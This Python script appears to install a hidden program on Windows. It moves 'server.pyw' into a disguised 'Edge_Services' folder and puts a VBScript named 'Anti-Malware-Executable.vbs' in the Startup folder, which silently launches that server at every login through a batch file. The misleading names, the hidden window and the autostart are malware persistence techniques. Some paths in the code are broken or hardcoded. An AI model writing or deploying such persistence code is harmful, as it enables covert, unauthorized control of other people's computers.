from os import remove, mkdir,path
import Dependinces as install
import shutil

def first_index(string : str, matches = 1, LastChar : str = '\\'):
    indexs = []
    for index, char in enumerate(string):
        if char == LastChar and len(indexs) < matches:
            indexs.append(index)
        elif len(indexs) > matches:
            break

    return indexs[-1]

desktop_path = path.expanduser('~\\Desktop')
cwd = path.dirname(path.abspath(__file__))

txtpath = first_index(desktop_path, 3)
txtpath = desktop_path[:txtpath] + "\\Edge_Services"

try:
    mkdir(txtpath)
except:
    pass

startup = 'D:\\desk\\inesert_username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup '

bat_contents = f'@echo off\ncd "{txtpath}"\npython server.pyw'

vbs_contents = f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "{desktop_path}\\win.bat" & Chr(34), 0
Set WshShell = Nothing'''

slice1 = first_index(startup, matches=3)
slice2 = first_index(cwd, matches=3)

paths = cwd[0:slice2] + startup[slice1:-1]
print(paths)
file = '\\Anti-Malware-Executable.vbs'

f = open(paths+file, 'w')
f.write(vbs_contents)
f.close()

f = open(txtpath+"\\win.bat", "w")
f.write(bat_contents)
f.close()

f = open(txtpath+"\\Dpath.txt", "w")
f.write(desktop_path)
f.close()

shutil.move("server.pyw", txtpath)
install.main()